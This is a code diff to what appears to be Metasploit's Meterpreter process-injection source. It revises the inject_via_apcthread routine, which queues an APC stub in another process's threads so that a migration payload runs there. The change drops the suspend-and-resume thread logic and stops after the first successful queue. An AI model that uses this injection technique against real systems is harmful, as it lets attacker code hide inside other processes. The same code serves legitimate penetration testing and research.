@@ -42,7 +42,6 @@ SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 #include <Tlhelp32.h>
 
 #include "thread.h"
-#include "list.h"
 #include "remote_thread.h"
 #include "LoadLibraryR.h"
 #include "base_inject.h"
@@ -146,16 +145,11 @@ DWORD inject_via_apcthread( HANDLE hProcess, DWORD dwProcessID, DWORD dwDestinat
     LPVOID lpApcStub           = NULL;
     LPVOID lpRemoteApcStub     = NULL;
     LPVOID lpRemoteApcContext  = NULL;
-    LIST * thread_list         = NULL;
     THREADENTRY32 t            = {0};
     APCCONTEXT ctx             = {0};
     DWORD dwApcStubLength          = 0;
 
     do {
-        thread_list = list_create();
-        if( !thread_list )
-            break;
-
         ctx.s.lpStartAddress = lpStartAddress;
         ctx.p.lpParameter    = lpParameter;
         ctx.bExecuted    = FALSE;
@@ -329,51 +323,24 @@ DWORD inject_via_apcthread( HANDLE hProcess, DWORD dwProcessID, DWORD dwDestinat
 
             dprint("[INJECT] inject_via_apcthread: Trying to inject into thread %d\n", t.th32ThreadID );
 
-            // Only inject into threads we can suspend to avoid synchronization issue whereby the new metsrv will attempt
-            // an ssl connection back but the client side will not be ready to accept it and we loose the session.
-            if( SuspendThread( hThread ) != (DWORD)-1 )
+            // Queue up our apc stub to run in the target thread, when our apc stub is run (when the target
+            // thread is placed in an alertable state) it will spawn a new thread with our actual migration payload.
+            // Any successfull call to NtQueueApcThread will make migrate_via_apcthread return ERROR_SUCCESS.
+            if( pNtQueueApcThread( hThread, lpRemoteApcStub, lpRemoteApcContext, 0, 0 ) == ERROR_SUCCESS )
             {
-                list_push( thread_list, hThread );
-
-                // Queue up our apc stub to run in the target thread, when our apc stub is run (when the target
-                // thread is placed in an alertable state) it will spawn a new thread with our actual migration payload.
-                // Any successfull call to NtQueueApcThread will make migrate_via_apcthread return ERROR_SUCCESS.
-                if( pNtQueueApcThread( hThread, lpRemoteApcStub, lpRemoteApcContext, 0, 0 ) == ERROR_SUCCESS )
-                {
-                    dprint("[INJECT] inject_via_apcthread: pNtQueueApcThread for thread %d Succeeded.\n", t.th32ThreadID );
-                    dwResult = ERROR_SUCCESS;
-                }
-                else
-                {
-                    dprint("[INJECT] inject_via_apcthread: pNtQueueApcThread for thread %d Failed.\n", t.th32ThreadID );
-                }
+                dprint("[INJECT] inject_via_apcthread: pNtQueueApcThread for thread %d Succeeded.\n", t.th32ThreadID );
+                dwResult = ERROR_SUCCESS;
             }
             else
             {
-                CloseHandle( hThread );
+                dprint("[INJECT] inject_via_apcthread: pNtQueueApcThread for thread %d Failed.\n", t.th32ThreadID );
             }
 
-            // keep searching for more target threads to inject our apc stub into...
+            CloseHandle( hThread );
 
-        } while( Thread32Next( hThreadSnap, &t ) );
+        } while( Thread32Next( hThreadSnap, &t ) && dwResult != ERROR_SUCCESS);
 
     } while( 0 );
-
-    if( thread_list )
-    {
-        // Resume all the threads which we queued our apc into as the remote
-        // client side will now be ready to handle the new ssl conenction.
-        while( TRUE )
-        {
-            HANDLE t = (HANDLE)list_pop( thread_list );
-            if( !t )
-            break;
-            ResumeThread( t );
-            CloseHandle( t );
-        }
-
-        list_destroy( thread_list );
-    }
 
     if( hThreadSnap )
         CloseHandle( hThreadSnap );
